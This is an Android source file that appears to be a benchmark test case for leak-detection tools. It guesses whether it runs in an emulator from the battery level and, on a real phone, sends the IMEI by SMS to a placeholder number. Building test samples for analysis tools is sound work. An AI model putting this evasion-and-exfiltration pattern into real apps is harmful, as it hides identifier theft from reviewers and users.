package com.example.newedtester;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.widget.TextView;

/**
 * @testcase_name EmulatorDetection_Battery1
 * @version 0.1
 * @author Malviya National Institute of Technology, Jaipur INDIA 
 * @author_mail jyotigajrani@gmail.com
 * 
 * @description This test detects the Android emulator by checking the battery status.
 * For emulator the battery status is always 50% or 0. This app send IMEI number via
 * SMS if the app runs on a real phone.
 * @dataflow onCreate: imei -> SMS 
 * @number_of_leaks 1
 * @challenges The (dynamic) analysis must avoid being detected and circumvented.
 */
public class MainActivity extends Activity {
	TextView txtStatus;
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		txtStatus = (TextView) findViewById(R.id.txtStatus);
		batteryLevel();
	}
	
	private void batteryLevel() {
        BroadcastReceiver batteryLevelReceiver = new BroadcastReceiver() {
            public void onReceive(Context context, Intent intent) {
                context.unregisterReceiver(this);
                int rawlevel = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                int level = -1;
                if (rawlevel >= 0 && scale > 0) {
                    level = (rawlevel * 100) / scale;
                }
                if (level==50|| level==0)
                txtStatus.setText("Battery Status: Emulator");
                else
                {
                	
                	TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                	String imei = telephonyManager.getDeviceId(); 
                	
        			SmsManager sm = SmsManager.getDefault();
        	    	String number = "+49 1234";
        	    	sm.sendTextMessage(number, null, imei, null, null); //sink, potential leak
        	    	txtStatus.setText("Battery Status: Device");
                }
            }
                 
        };
        IntentFilter batteryLevelFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        registerReceiver(batteryLevelReceiver, batteryLevelFilter);
    }


	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}